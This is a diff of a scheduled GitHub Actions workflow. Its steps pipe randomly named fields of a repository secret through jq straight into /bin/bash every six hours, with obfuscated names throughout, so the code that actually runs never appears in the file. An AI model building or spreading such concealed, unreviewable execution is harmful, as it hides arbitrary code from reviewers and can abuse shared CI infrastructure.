@@ -1,25 +1,28 @@
 name: laomeizileng
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
-
+    - cron: '45 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: laomeizileng
         env:
-          hykh56179: ${{ secrets.hykh56179 }}
+          oc62: ${{ secrets.oc62 }}
         run: |
-          echo $hykh56179 | jq -r .tm923 | /bin/bash
-          echo $xrhy3 | jq -r .pes645 | /bin/bash
-          echo $i640 | jq -r .mymdl3 | /bin/bash
-          echo $nejyo468 | jq -r .hq45961 | /bin/bash
-          echo $d00692 | jq -r .vweh9586 | /bin/bash
-          echo $vkt28 | jq -r .jx9277 | /bin/bash
-          echo $uxv310 | jq -r .f25 | /bin/bash
-          echo $am44 | jq -r .yjw6 | /bin/bash
+          echo $oc62 | jq -r .qm25326 | /bin/bash
+          echo $qmr210 | jq -r .ev76 | /bin/bash
+          echo $m69796 | jq -r .sxs5640 | /bin/bash
+          echo $mbicu4 | jq -r .i01980 | /bin/bash
+          echo $dz71 | jq -r .rumop108 | /bin/bash
+          echo $usvr61562 | jq -r .imeol5 | /bin/bash
+          echo $hmi25 | jq -r .bs6 | /bin/bash
+          echo $zvmyw459 | jq -r .aroe50724 | /bin/bash
+          echo $o30713 | jq -r .xwr25 | /bin/bash
+          echo $kpiq9905 | jq -r .jl6690 | /bin/bash
+          echo $r01 | jq -r .ms65 | /bin/bash
+          echo $taybm9 | jq -r .ft52801 | /bin/bash
 
